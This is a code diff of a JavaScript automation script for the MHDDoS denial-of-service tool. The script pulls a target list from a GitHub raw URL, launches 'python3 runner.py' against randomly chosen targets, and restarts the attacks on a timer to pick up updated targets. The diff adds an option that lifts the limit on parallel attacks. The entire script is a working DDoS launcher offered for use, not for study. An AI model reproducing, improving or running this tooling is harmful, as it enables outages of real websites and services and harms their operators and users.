@@ -4,8 +4,8 @@
 
 // ===== CONSTANTS
 
-const second = 1;
-const minute = second * 60;
+const SECOND = 1;
+const MINUTE = SECOND * 60;
 
 // ===== ARGUMENTS
 
@@ -13,12 +13,30 @@ const {
   _, // we don't need positional arguments
   c, // we don't need custom targets
   config, // we don't need custom targets
-  /** minimum – 1, maximum – number of targets */
+  /** @type {number | string} minimum – 1, maximum – number of targets, or 'all' */
   parallel = 1,
-  'restart-interval': restartInterval = minute * 10,
+  'disable-parallel-limit': disableParallelLimit = false,
+  /** minimum – 5 minutes */
+  'restart-interval': restartInterval = MINUTE * 10,
   debug = true,
   ...mhddosArgs
 } = argv;
+
+if (disableParallelLimit) {
+  console.log(
+    chalk.redBright.bold(
+      'WARNING: Disabling parallel limits can lead to unexpected results. Your system may become unresponsive or get damaged. Use at your own risk.',
+    ),
+  );
+
+  const answer = await question('Continue? (y/N) ');
+  const shouldContinue = answer === 'y';
+
+  if (!shouldContinue) {
+    console.log(chalk('Aborted.'));
+    process.exit();
+  }
+}
 
 const mhddosFlags = parseFlags(mhddosArgs);
 
@@ -27,12 +45,11 @@ const mhddosFlags = parseFlags(mhddosArgs);
 await startAttack();
 
 const intervalId = setInterval(async () => {
-  await quiet(nothrow($`pkill -f runner.py`));
-  console.log(`\nStopped attacks, updating targets.\n\n${'-'.repeat(50)}\n`);
-
+  await stopAttack();
   await startAttack();
-}, Math.max(minute * 5, restartInterval) * 1000);
+}, Math.max(MINUTE * 5, restartInterval) * 1000);
 
+// handling Ctrl+C
 process.on('SIGINT', function () {
   clearInterval(intervalId);
   process.exit();
@@ -41,37 +58,33 @@ process.on('SIGINT', function () {
 // ===== UTILS
 
 async function startAttack() {
-  const targets = await getRandomTargets(parallel);
+  const targets = await getRandomTargets();
   const flags = [debug ? '--debug' : undefined, ...mhddosFlags];
-  // console.log({ targets });
-  // console.log({ flags });
 
   if (targets.length) {
-    console.log('\nStarting attacks...');
+    console.log(chalk('\nStarting attacks...'));
     targets.forEach(async (target) => {
       nothrow($`python3 runner.py ${target.split(' ')} ${flags.filter(Boolean)}`);
     });
   } else {
-    console.log(`There are currently no active targets. Waiting for updates from curators...`);
+    console.log(chalk('There are currently no active targets. Waiting for updates from curators...'));
   }
 }
 
-async function getRandomTargets(parallel) {
+async function stopAttack() {
+  await quiet(nothrow($`pkill -f runner.py`));
+  console.log(chalk(`\nStopped attacks, updating targets.\n\n${'-'.repeat(50)}\n`));
+}
+
+async function getRandomTargets() {
   const targets = await getTargetList();
-  const targetLength =
-    parallel === 'all'
-      ? targets.length
-      : typeof parallel === 'number'
-      ? Math.max(1, Math.min(parallel, targets.length))
-      : 1;
-  // console.log({ targets });
-  // console.log({ targetLength });
+  const goalLength = computeGoalLength(targets);
   const randomTargets = [];
 
-  while (randomTargets.length < targetLength) {
+  while (randomTargets.length < goalLength) {
     const randomTarget = targets[Math.floor(Math.random() * targets.length)];
 
-    if (!randomTargets.includes(randomTarget)) {
+    if (!randomTargets.includes(randomTarget) || randomTargets.length >= targets.length) {
       randomTargets.push(randomTarget);
     }
   }
@@ -80,11 +93,11 @@ async function getRandomTargets(parallel) {
 }
 
 async function getTargetList() {
-  console.log('Getting targets...');
+  console.log(chalk('Getting targets...'));
   const response = await fetch('https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets');
 
   if (!response.ok) {
-    console.log('Failed to get targets.');
+    console.log(chalk.redBright('Failed to get targets.'));
     return [];
   }
 
@@ -98,4 +111,24 @@ function parseFlags(args) {
   return Object.entries(args).map(([key, value]) => {
     return `${key.length === 1 ? '-' : '--'}${key}=${value}`;
   });
+}
+
+function computeGoalLength(targets) {
+  if (parallel === 'all') {
+    return targets.length;
+  }
+
+  if (typeof parallel !== 'number') {
+    return 1;
+  }
+
+  return clamp({
+    value: parallel,
+    min: 1,
+    max: disableParallelLimit ? parallel : targets.length,
+  });
+}
+
+function clamp({ value, min, max }) {
+  return Math.max(min, Math.min(value, max));
 }
